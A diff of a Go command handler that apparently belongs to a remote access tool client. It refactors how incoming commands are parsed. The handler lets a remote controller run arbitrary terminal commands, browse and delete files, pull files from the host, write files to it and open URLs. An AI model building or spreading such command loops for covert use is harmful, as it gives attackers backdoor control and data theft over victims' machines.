@@ -127,20 +127,24 @@ func (h *Handler) HandleCommand() {
 			defer func() { h.DoingRequest = false }()
 			h.DoingRequest = true
 
-			requestCommand, err := h.ReceiveCommand()
+			command, err := h.ReceiveCommand()
 			if err != nil {
 				h.Connected = false
 				return
 			}
-			if len(strings.TrimSpace(requestCommand.Request)) == 0 {
+			if len(strings.TrimSpace(command.Request)) == 0 {
 				return
 			}
 
 			var response []byte
 			var hasErr bool
 
-			commandParts := strings.Split(requestCommand.Request, " ")
-			switch strings.ToLower(strings.TrimSpace(commandParts[0])) {
+			commandParts := strings.Split(command.Request, " ")
+
+			mainCommand := strings.ToLower(commandParts[0])
+			subCommand := strings.Join(commandParts[1:], " ")
+
+			switch mainCommand {
 			case "getos":
 				deviceSpecs, err := h.Services.Information.LoadDeviceSpecs()
 				if err != nil {
@@ -184,7 +188,7 @@ func (h *Handler) HandleCommand() {
 				}
 				break
 			case "explore":
-				fileExplorer, err := h.Services.Explorer.ExploreDirectory(commandParts[1])
+				fileExplorer, err := h.Services.Explorer.ExploreDirectory(subCommand)
 				if err != nil {
 					response = encode.StringToByte(err.Error())
 					hasErr = true
@@ -194,7 +198,7 @@ func (h *Handler) HandleCommand() {
 				response = explorerBytes
 				break
 			case "download":
-				filepath := strings.TrimSpace(strings.ReplaceAll(requestCommand.Request, "download", ""))
+				filepath := strings.TrimSpace(strings.ReplaceAll(command.Request, "download", ""))
 				res, err := h.Services.Upload.UploadFile(filepath)
 				if err != nil {
 					response = encode.StringToByte(err.Error())
@@ -204,7 +208,7 @@ func (h *Handler) HandleCommand() {
 				response = res
 				break
 			case "delete":
-				filepath := strings.TrimSpace(strings.ReplaceAll(requestCommand.Request, "delete", ""))
+				filepath := strings.TrimSpace(strings.ReplaceAll(command.Request, "delete", ""))
 				err := h.Services.Delete.DeleteFile(filepath)
 				if err != nil {
 					response = encode.StringToByte(err.Error())
@@ -213,7 +217,7 @@ func (h *Handler) HandleCommand() {
 				}
 				break
 			case "upload":
-				filepath := strings.TrimSpace(strings.ReplaceAll(requestCommand.Request, "upload", ""))
+				filepath := strings.TrimSpace(strings.ReplaceAll(command.Request, "upload", ""))
 				res, err := h.Services.Download.DownloadFile(filepath)
 				if err != nil {
 					response = encode.StringToByte(err.Error())
@@ -223,7 +227,7 @@ func (h *Handler) HandleCommand() {
 				response = res
 				break
 			case "open-url":
-				err := h.Services.URL.OpenURL(commandParts[1])
+				err := h.Services.URL.OpenURL(subCommand)
 				if err != nil {
 					response = encode.StringToByte(err.Error())
 					hasErr = true
@@ -232,7 +236,7 @@ func (h *Handler) HandleCommand() {
 				break
 			default:
 				response = encode.StringToByte(
-					h.Services.Terminal.Run(requestCommand.Request, h.Configuration.Connection.ContextDeadline))
+					h.Services.Terminal.Run(command.Request, h.Configuration.Connection.ContextDeadline))
 			}
 
 			body, err := json.Marshal(entities.Payload{
